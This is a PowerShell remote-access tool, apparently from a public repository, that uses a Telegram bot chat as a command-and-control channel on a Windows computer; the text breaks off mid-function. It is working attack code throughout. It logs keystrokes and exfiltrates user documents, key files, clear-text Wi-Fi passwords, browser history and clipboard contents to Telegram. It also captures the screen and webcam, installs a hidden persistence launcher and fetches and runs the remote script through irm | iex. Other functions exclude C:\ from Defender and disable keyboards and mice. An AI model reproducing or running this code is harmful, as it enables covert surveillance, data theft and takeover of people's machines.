<# ============================================= Beigeworm's Telegram C2 Client ========================================================

SYNOPSIS
Using a Telegram Bot's Chat to Act as a Command and Control Platform.

INFORMATION
This script will wait until it is called in chat by the computer name to take commands from telegram.
A list of Modules can be accessed by typing 'options' in chat, or you can use the chat to act simply as a reverse shell.

SEE README FOR MORE INFO
#>
# ---------------------------------------------- SCRIPT SETUP -----------------------------------------------
# Define Connection Variables
$Token = "$tg"  # REPLACE $tg with Your Telegram Bot Token ( LEAVE ALONE WHEN USING A STAGER.. eg. A Flipper Zero,  Start-TGC2-Client.vbs etc )
$PassPhrase = "Xm3f8xgzwe@" # 'password' for this connection (computername by default)
$global:errormsg = 1 # 1 = return error messages to chat (off by default)
$parent = "https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Command-and-Control/Telegram-C2-Client.ps1" # parent script URL (for restarts and persistance)
$apiUrl = "https://api.telegram.org/bot$Token/sendMessage"
$URL = 'https://api.telegram.org/bot{0}' -f $Token
$AcceptedSession=""
$LastUnAuthenticatedMessage=""
$lastexecMessageID=""

# Startup Delay
Sleep 5
if(Test-Path "C:\Windows\Tasks\service.vbs"){rm -path "C:\Windows\Tasks\service.vbs" -Force}

# Get Chat ID from the bot
while($chatID.length -eq 0){
    $updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
    if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
    if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id}}
    Sleep 10
}

# Emoji characters and other setup
$charCodes = @(0x2705, 0x1F4BB, 0x274C, 0x1F55C, 0x1F50D, 0x1F517, 0x23F8)
$chars = $charCodes | ForEach-Object { [char]::ConvertFromUtf32($_) }
$tick, $comp, $closed, $waiting, $glass, $cmde, $pause = $chars
$scriptDirectory = Get-Content -path $MyInvocation.MyCommand.Name -Raw
#$scriptDirectory = Get-Content -Path $PSScriptRoot -Raw
$Mts = New-Object psobject 
$Mts | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID

#----------------------------------------------- COMMANDS / FUNCTIONS ----------------------------------------------

Function Options{
$contents = "==============================================
============= $cmde Commands List $cmde ============
==============================================

Close   : Close this Session
Extra-Info    : Extra commands information
Pause-Session   : Kills this session and restarts
Toggle-Errors    : Toggle error messages to chat
Folder-Tree    : Gets Dir tree and sends it zipped
Screenshot   : Sends a screenshot of the desktop
Key-Capture    : Capture Keystrokes and send
Exfiltrate   : Sends files (see 'Extra-Info' for more)
Upload      : Uploads a specific file (use -path)
System-Info   : Send System info as text file
Software-Info   : Send Software info as text file
History-Info   : Send History info as text file
Enumerate-LAN   : Info for other devices on the LAN
Add-Persistance   : Add Telegram C2 to Startup
Remove-Persistance   : Remove Startup Persistance
Is-Admin   : Checks if session has admin Privileges
Attempt-Elevate  : Send user a prompt to gain Admin
Message   : Send a custom message to the user
Take-Picture  : Send a Webcann picture.
Kill    : Killswitch for 'Key-Capture' and 'Exfiltrate' 
**ADMIN ONLY FUNCTIONS**
Disable-AV   : Attempt to exclude C:/ from Defender
Disable-HID   : Disable Mice and Keyboards
Enable-HID    : Enable Mice and Keyboards

=============================================="
Post-Message | Out-Null
}

Function Extra-Info{
$contents = "==============================================
============ $glass Examples and Info $glass ===========
==============================================

=========  Exfiltrate Command Examples ==========
( PS`> Exfiltrate -Path Documents -Filetype png )
( PS`> Exfiltrate -Filetype log )
( PS`> Exfiltrate )
Exfiltrate only will send many pre-defined filetypes
from all User Folders like Documents, Downloads etc..

PATH
Documents, Desktop, Downloads,
OneDrive, Pictures, Videos.
FILETYPE
log, db, txt, doc, pdf, jpg, jpeg, png,
wdoc, xdoc, cer, key, xls, xlsx,
cfg, conf, docx, rft.

===========  Upload Command Example ===========
( PS`> Upload -Path C:/Path/To/File.txt )
Use 'Folder-Tree' command to show all files

============  Enumerate-LAN Example ============
( PS`> Enumerate-LAN -Prefix 192.168.1. )
This Eg. will scan 192.168.1.1 to 192.168.1.254

===============  Message Example ===============
( PS`> Message 'Your Message Here!' )

=============================================="
Post-Message | Out-Null
}

Function Close{
$contents = "$comp $env:COMPUTERNAME $closed Connection Closed"
Post-Message
rm -Path "$env:temp/tgc2.txt" -Force
exit
}

Function Upload{
param ([string[]]$Path)
if (Test-Path -Path $path){
    $extension = [System.IO.Path]::GetExtension($path)
    if ($extension -eq ".exe" -or $extension -eq ".msi") {
        $tempZipFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.IO.Path]::GetFileName($path))
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::CreateFromDirectory($path, $tempZipFilePath)
        curl.exe -F chat_id="$ChatID" -F document=@"$tempZipFilePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
        Write-Output "File Upload Complete: $path"
        Rm -Path $tempZipFilePath -Recurse -Force
    }else{
        curl.exe -F chat_id="$ChatID" -F document=@"$Path" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
        Write-Output "File Upload Complete: $path"
    }
}else{Write-Host "File Not Found: $path"}
}

Function Exfiltrate {
param ([string[]]$FileType,[string[]]$Path)
$maxZipFileSize = 50MB
$currentZipSize = 0
$index = 1
$FilePath ="$env:temp/Loot$index.zip"
$contents = "$env:COMPUTERNAME $tick Exfiltration Started.. (Stop with Killswitch)"
Post-Message | Out-Null
If($Path -ne $null){$foldersToSearch = "$env:USERPROFILE\"+$Path}
else{$foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")}
If($FileType -ne $null){$fileExtensions = "*."+$FileType}
else {$fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.docx", "*.rft")}
Add-Type -AssemblyName System.IO.Compression.FileSystem
$zipArchive = [System.IO.Compression.ZipFile]::Open($FilePath, 'Create')
$escmsg = "Files from : "+$env:COMPUTERNAME
foreach ($folder in $foldersToSearch) {
    foreach ($extension in $fileExtensions) {
        $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse
        foreach ($file in $files) {
            $fileSize = $file.Length
            if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
                $zipArchive.Dispose()
                $currentZipSize = 0
                Post-File; rm -Path $FilePath -Force
                Sleep 1
                $index++
                $FilePath ="$env:temp/Loot$index.zip"
                $zipArchive = [System.IO.Compression.ZipFile]::Open($FilePath, 'Create')
                $messages=ReceiveMSG
                    if ($messages.message.text -contains "kill") {
                    $contents = "$comp $env:COMPUTERNAME $closed Exfiltration Killed"
                    Post-Message
                    break
                    }
                }
                $entryName = $file.FullName.Substring($folder.Length + 1)
                [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
                $currentZipSize += $fileSize
            }
        }
    }
$zipArchive.Dispose()
Post-File ;rm -Path $FilePath -Force
$contents = "$env:COMPUTERNAME $tick Exfiltration Complete!"
Post-Message | Out-Null
}

Function Screenshot{
Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)
$filePath = "$env:temp\sc.png"
$bitmap.Save($filePath, [System.Drawing.Imaging.ImageFormat]::Png)
$graphics.Dispose()
$bitmap.Dispose()
Post-File; rm -Path $filePath -Force
}

Function Key-Capture {
$contents = "$env:COMPUTERNAME $tick KeyCapture Started.. (Stop with Killswitch)"
Post-Message | Out-Null
$API = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); [DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int GetKeyboardState(byte[] keystate);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int MapVirtualKey(uint uCode, int uMapType);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);'
$API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
$KeypressThreshold = [TimeSpan]::FromSeconds(10)
While ($true){
    $keyPressed = $false
    try{
    while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
        Start-Sleep -Milliseconds 30
        for ($asc = 8; $asc -le 254; $asc++){
        $keyst = $API::GetAsyncKeyState($asc)
            if ($keyst -eq -32767) {
            $keyPressed = $true
            $LastKeypressTime.Restart()
            $null = [console]::CapsLock
            $vtkey = $API::MapVirtualKey($asc, 3)
            $kbst = New-Object Byte[] 256
            $checkkbst = $API::GetKeyboardState($kbst)
            $logchar = New-Object -TypeName System.Text.StringBuilder          
                if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
                $LString = $logchar.ToString()
                    if ($asc -eq 8) {$LString = "[BKSP]"}
                    if ($asc -eq 13) {$LString = "[ENT]"}
                    if ($asc -eq 27) {$LString = "[ESC]"}
                    $nosave += $LString 
                    }
                }
            }
        }
        $messages=ReceiveMSG
        if ($messages.message.text -contains "kill") {
        $contents = "$comp $env:COMPUTERNAME $closed KeyCapture Killed"
        Post-Message | Out-Null
        break
        }
    }
    finally{
        If ($keyPressed -and $messages.message.text -notcontains "kill") {
            $escmsgsys = $nosave -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
            $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
            $contents = "$glass Keys Captured : "+$escmsgsys
            Post-Message | Out-Null
            $keyPressed = $false
            $nosave = ""
        }
    }
$LastKeypressTime.Restart()
Start-Sleep -Milliseconds 10
}
}

Function System-Info{
$fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full")
$email = GPRESULT -Z /USER $Env:username | Select-String -Pattern "([a-zA-Z0-9_\-\.]+)@([a-zA-Z0-9_\-\.]+)\.([a-zA-Z]{2,5})" -AllMatches;$email = ("$email").Trim()
$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content
$computerIP = get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.DefaultIPGateway.length -gt 1}
$NearbyWifi = explorer.exe ms-availablenetworks: ; sleep 4; (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Signal*" -or $_ -like "*Band*"}).trim()
$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 
$computerSystem = Get-CimInstance CIM_ComputerSystem
$computerBIOS = Get-CimInstance CIM_BIOSElement
$computerOs=Get-WmiObject win32_operatingsystem | select Caption, CSName, Version, @{Name="InstallDate";Expression={([WMI]'').ConvertToDateTime($_.InstallDate)}} , @{Name="LastBootUpTime";Expression={([WMI]'').ConvertToDateTime($_.LastBootUpTime)}}, @{Name="LocalDateTime";Expression={([WMI]'').ConvertToDateTime($_.LocalDateTime)}}, CurrentTimeZone, CountryCode, OSLanguage, SerialNumber, WindowsDirectory  | Format-List
$computerCpu=Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List
$computerMainboard=Get-WmiObject Win32_BaseBoard | Format-List
$computerRamCapacity=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}
$computerRam=Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table
$videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution
$Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, FileSystem,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,FileSystem,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; }
$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table
$systemLocale = Get-WinSystemLocale;$systemLanguage = $systemLocale.Name
$userLanguageList = Get-WinUserLanguageList;$keyboardLayoutID = $userLanguageList[0].InputMethodTips[0]
$outssid="";$a=0;$ws=(netsh wlan show profiles) -replace ".*:\s+";foreach($s in $ws){
if($a -gt 1 -And $s -NotMatch " policy " -And $s -ne "User profiles" -And $s -NotMatch "-----" -And $s -NotMatch "<None>" -And $s.length -gt 5){$ssid=$s.Trim();if($s -Match ":"){$ssid=$s.Split(":")[1].Trim()}
$pw=(netsh wlan show profiles name=$ssid key=clear);$pass="None";foreach($p in $pw){if($p -Match "Key Content"){$pass=$p.Split(":")[1].Trim();$outssid+="SSID: $ssid : Password: $pass`n"}}}$a++;}
$FilePath = "$env:temp\SystemInfo.txt"
"USER INFO `n =========================================================================`n" | Out-File -FilePath $FilePath -Encoding ASCII
"$fullName" | Out-File -FilePath $FilePath -Encoding ASCII -Append
"Email Address      : $email" | Out-File -FilePath $FilePath -Encoding ASCII -Append
"Computer Name      : $env:COMPUTERNAME" | Out-File -FilePath $FilePath -Encoding ASCII -Append
"Language           : $systemLanguage" | Out-File -FilePath $FilePath -Encoding ASCII -Append
"Keyboard Layout    : $keyboardLayoutID`n" | Out-File -FilePath $FilePath -Encoding ASCII -Append
"OS Info            `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
($computerOs| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
"NETWORK INFO `n ======================================================================`n" | Out-File -FilePath $FilePath -Encoding ASCII -Append
"Public IP          : $computerPubIP`n" | Out-File -FilePath $FilePath -Encoding ASCII -Append
"vvv  Saved Networks  vvv `n$outssid" | Out-File -FilePath $FilePath -Encoding ASCII -Append
"Local IP           `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
($computerIP| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
"Adapters           `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
($network| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
"Nearby-WiFi        `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
($NearbyWifi| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
"HARDWARE INFO `n ======================================================================`n" | Out-File -FilePath $FilePath -Encoding ASCII -Append
"BIOS Info          : $computerBIOS`n" | Out-File -FilePath $FilePath -Encoding ASCII -Append
"vvv  RAM Info  vvv `nTotal RAM : $computerRamCapacity" | Out-File -FilePath $FilePath -Encoding ASCII -Append
($computerRam| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
"CPU Info           `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
($computerCpu| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
"Graphics Info      `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
($videocard| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
"HDD Info           `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
($Hdds| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
"USB Info           `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
($COMDevices| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
Post-File ;rm -Path $FilePath -Force
}

Function Software-Info{
$process=Get-WmiObject win32_process | select Handle, ProcessName, ExecutablePath, CommandLine
$service=Get-CimInstance -ClassName Win32_Service | select State,Name,StartName,PathName | Where-Object {$_.State -like 'Running'}
$software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize
$drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion
$FilePath = "$env:temp\SoftwareInfo.txt"
"SOFTWARE INFO `n ======================================================================" | Out-File -FilePath $FilePath -Encoding ASCII -Append
"Installed Software `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
($software| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
"Processes          `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
($process| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
"Services           `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
($service| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
Post-File ;rm -Path $FilePath -Force
}

Function History-Info{
$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
$Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
$Value | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}
$Regex2 = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?';$Pathed = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
$Value2 = Get-Content -Path $Pathed | Select-String -AllMatches $regex2 |% {($_.Matches).Value} |Sort -Unique
$Value2 | ForEach-Object {$Key = $_;if ($Key -match $Search){New-Object -TypeName PSObject -Property @{User = $env:UserName;Browser = 'chrome';DataType = 'history';Data = $_}}}
$pshist = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt";$pshistory = Get-Content $pshist -raw
$FilePath = "$env:temp\History.txt"
"HISTORY INFO `n ====================================================================== `n" | Out-File -FilePath $FilePath -Encoding ASCII -Append
"Clipboard          `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
(Get-Clipboard | Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
"Browser History    `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
($Value| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
($Value2| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
"Powershell History `n -----------------------------------------------------------------------" | Out-File -FilePath $FilePath -Encoding ASCII -Append
($pshistory| Out-String) | Out-File -FilePath $FilePath -Encoding ASCII -Append
Post-File ;rm -Path $FilePath -Force
}

Function Enumerate-LAN{
param ([string]$Prefix)
if ($Prefix.Length -eq 0){Write-Output "Use -prefix to define the first 3 parts of an IP Address eg. Enumerate-LAN -prefix 192.168.1";sleep 1 ;return}
$FileOut = "$env:temp\Computers.csv"
1..255 | ForEach-Object {
    $ipAddress = "$Prefix.$_"
    Start-Process -WindowStyle Hidden ping.exe -ArgumentList "-n 1 -l 0 -f -i 2 -w 100 -4 $ipAddress"
    }
$Computers = (arp.exe -a | Select-String "$Prefix.*dynam") -replace ' +', ',' |
             ConvertFrom-Csv -Header Computername, IPv4, MAC, x, Vendor |
             Select-Object IPv4, MAC
$Computers | Export-Csv $FileOut -NoTypeInformation
$data = Import-Csv $FileOut
$data | ForEach-Object {
    $mac = $_.'MAC'
    $apiUrl = "https://api.macvendors.com/$mac"
    $manufacturer = (Invoke-RestMethod -Uri $apiUrl).Trim()
    Start-Sleep -Seconds 1
    $_ | Add-Member -MemberType NoteProperty -Name "manufacturer" -Value $manufacturer -Force
    }
$data | Export-Csv $FileOut -NoTypeInformation
$data | ForEach-Object {
    try {
        $ip = $_.'IPv4'
        $hostname = ([System.Net.Dns]::GetHostEntry($ip)).HostName
        $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value $hostname -Force
    } 
    catch {
        $_ | Add-Member -MemberType NoteProperty -Name "Hostname" -Value "Error: $($_.Exception.Message)"  
    }
}
$data | Export-Csv $FileOut -NoTypeInformation
$results = Get-Content -Path $FileOut -Raw
Write-Output "$results"
rm -Path $FileOut
}

Function Folder-Tree{
tree $env:USERPROFILE/Desktop /A /F | Out-File $env:temp/Desktop.txt
tree $env:USERPROFILE/Documents /A /F | Out-File $env:temp/Documents.txt
tree $env:USERPROFILE/Downloads /A /F | Out-File $env:temp/Downloads.txt
tree $env:APPDATA /A /F | Out-File $env:temp/Appdata.txt
tree $env:PROGRAMFILES /A /F | Out-File $env:temp/ProgramFiles.txt
$FilePath ="$env:temp/TreesOfKnowledge.zip"
Compress-Archive -Path $env:TEMP\Desktop.txt, $env:TEMP\Documents.txt, $env:TEMP\Downloads.txt, $env:TEMP\Appdata.txt, $env:TEMP\ProgramFiles.txt -DestinationPath $FilePath
sleep 1
Post-File ;rm -Path $FilePath -Force
Write-Output "Done."
}

Function Add-Persistance{
#$newScriptPath = "$env:APPDATA\Microsoft\Windows\PowerShell\copy.ps1"
$newScriptPath = "$env:USERPROFILE\Desktop\test\copy.ps1"
$scriptContent | Out-File -FilePath $newScriptPath -force
sleep 1
if ($newScriptPath.Length -lt 100){
    "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
    i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
    sleep 1
    Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
    }
$tobat = @'
Set objShell = CreateObject("WScript.Shell")
userProfile = objShell.ExpandEnvironmentStrings("%USERPROFILE%")
objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File """ & userProfile & "\Desktop\test\copy.ps1""", 0, True
'@
$pth = "$env:USERPROFILE\Desktop\test\service.vbs"
$tobat | Out-File -FilePath $pth -Force
Write-Output "Persistance Added."
rm -path "$env:TEMP\temp.ps1" -Force
}

Function Remove-Persistance{
rm -Path "$env:USERPROFILE\Desktop\test\service.vbs"
rm -Path "$env:USERPROFILE\Desktop\test\copy.ps1"
Write-Output "Uninstalled."
}

Function Pause-Session{
$contents = "$env:COMPUTERNAME $pause Session Paused. $pause (Re-Enter password to resume..)"
Post-Message | Out-Null
$script:AcceptedSession=""
}

Function Is-Admin{
If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
    $contents = "$closed Current Session is NOT Admin $closed"
    Post-Message | Out-Null
    }
    else{
    $contents = "$tick Current Session IS Admin $tick"
    Post-Message | Out-Null
    }
}

Function Attempt-Elevate{
$tobat = @"
Set WshShell = WScript.CreateObject(`"WScript.Shell`")
WScript.Sleep 200
If Not WScript.Arguments.Named.Exists(`"elevate`") Then
  CreateObject(`"Shell.Application`").ShellExecute WScript.FullName _
    , `"`"`"`" & WScript.ScriptFullName & `"`"`" /elevate`", `"`", `"runas`", 1
  WScript.Quit
End If
WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tg='$tg'; irm https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Command-and-Control/Telegram-C2-Client.ps1 | iex`", 0, True
"@
$pth = "C:\Windows\Tasks\service.vbs"
$tobat | Out-File -FilePath $pth -Force
& $pth
Sleep 7
rm -Path $pth
Write-Output "Done."
}

Function Toggle-Errors{
If($global:errormsg -eq 0){
    $global:errormsg = 1
    $contents = "$tick Error Messaging ON $tick"
    Post-Message | Out-Null
    return
    }
If($global:errormsg -eq 1){
    $global:errormsg = 0
    $contents = "$closed Error Messaging OFF $closed"
    Post-Message | Out-Null
    return
    }
}

Function Message([string]$Message){
    msg.exe * $Message
    Write-Output "Done."
}

Function Take-Picture {
$outputFolder = "$env:USERPROFILE\Desktop\8zTl45PSA"
$outputFile = "$env:USERPROFILE\Desktop\8zTl45PSA\captured_image.jpg"
$tempFolder = "$env:USERPROFILE\Desktop\\8zTl45PSA\ffmpeg"
if (-not (Test-Path -Path $outputFolder)) {
    New-Item -ItemType Directory -Path $outputFolder | Out-Null
}
if (-not (Test-Path -Path $tempFolder)) {
    New-Item -ItemType Directory -Path $tempFolder | Out-Null
}
$ffmpegDownload = "https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip"
$ffmpegZip = "$tempFolder\ffmpeg-release-essentials.zip"
if (-not (Test-Path -Path $ffmpegZip)) {
    I`wr -Uri $ffmpegDownload -OutFile $ffmpegZip
}
Expand-Archive -Path $ffmpegZip -DestinationPath $tempFolder -Force
$videoDevice = $null
$videoDevice = Get-CimInstance Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'Image' } | Select-Object -First 1
if (-not $videoDevice) {
    $videoDevice = Get-CimInstance Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'Camera' } | Select-Object -First 1
}
if (-not $videoDevice) {
    $videoDevice = Get-CimInstance Win32_PnPEntity | Where-Object { $_.PNPClass -eq 'Media' } | Select-Object -First 1
}
if ($videoDevice) {
    $videoInput = $videoDevice.Name
    $ffmpegVersion = Get-ChildItem -Path $tempFolder -Filter "ffmpeg-*-essentials_build" | Select-Object -ExpandProperty Name
    $ffmpegVersion = $ffmpegVersion -replace 'ffmpeg-(\d+\.\d+)-.*', '$1'
    $ffmpegPath = Join-Path -Path $tempFolder -ChildPath ("ffmpeg-{0}-essentials_build\bin\ffmpeg.exe" -f $ffmpegVersion)
    & $ffmpegPath -f dshow -i video="$videoInput" -frames:v 1 $outputFile -y
    Write-Host "Image captured and saved to $outputFile."
} else {
    Write-Host "No video devices found on the system."
}
    curl.exe -F chat_id="$ChatID" -F document=@"$outputFile" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null
    sleep 1
    Remove-Item -Path $outputFile -Force
}

# ---------------------------------------- ADMIN ONLY FUNCTIONS --------------------------------------------------

Function Disable-AV{
    Add-MpPreference -ExclusionPath C:\
    Write-Output "Done."
}

Function Disable-HID{
    $contents = "$env:COMPUTERNAME $closed Disabling HID Inputs.."
    Post-Message | Out-Null
    $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
    $PNPMice.Disable()
    $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
    $PNPKeyboard.Disable()
}

Function Enable-HID{
    $contents = "$env:COMPUTERNAME $tick Enabling HID Inputs.."
    Post-Message | Out-Null
    $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
    $PNPMice.Enable()
    $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
    $PNPKeyboard.Enable()
}

# --------------------------------------------- TELEGRAM FUCTIONS -------------------------------------------------

# Posting Functions
Function Post-Message{$script:params = @{chat_id = $ChatID ;text = $contents};Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params}
Function Post-File{curl.exe -F chat_id="$ChatID" -F document=@"$filePath" "https://api.telegram.org/bot$Token/sendDocument" | Out-Null}

Function ShowButtons{
$messagehead = "Press a Button to Continue..."
$inlineKeyboardJson = '{"inline_keyboard":[[{"text": "Enter Commands","callback_data": "button_clicked"},{"text": "Options","callback_data": "button2_clicked"}]]}'
$paramers = @{chat_id = $chatId ;text = $messagehead ;reply_markup = $inlineKeyboardJson}
Invoke-RestMethod -Uri $apiUrl -Method POST -ContentType "application/json" -Body ($paramers | ConvertTo-Json -Depth 10)
$killint = 0
$offset = 0
while ($killint -eq 0) {
    $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset" -Method Get
    foreach ($update in $updates.result) {
        $offset = $update.update_id + 1
        Sleep 1
        if ($update.callback_query.data -eq "button_clicked") {$killint = 1}
        if ($update.callback_query.data -eq "button2_clicked") {$killint = 1;Options}
        }
    Sleep 1
    }
$contents = "$comp $env:COMPUTERNAME $tick Session Started"
Post-Message
}

# Session Authentication
Function IsAuth{ 
param($CheckMessage)
    if (($messages.message.date -ne $LastUnAuthMsg) -and ($CheckMessage.message.text -like $PassPhrase) -and ($CheckMessage.message.from.is_bot -like $false)){
        $script:AcceptedSession="Authenticated"
        $contents = "$comp $env:COMPUTERNAME $tick Session Starting..."
        Post-Message
        ShowButtons
        return $messages.message.chat.id
    }Else{return 0}
}

# format long strings
Function CleanString{
param($Stream)
$FixedResult=@()
$Stream | Out-File -FilePath (Join-Path $env:temp -ChildPath "tgc2.txt") -Force
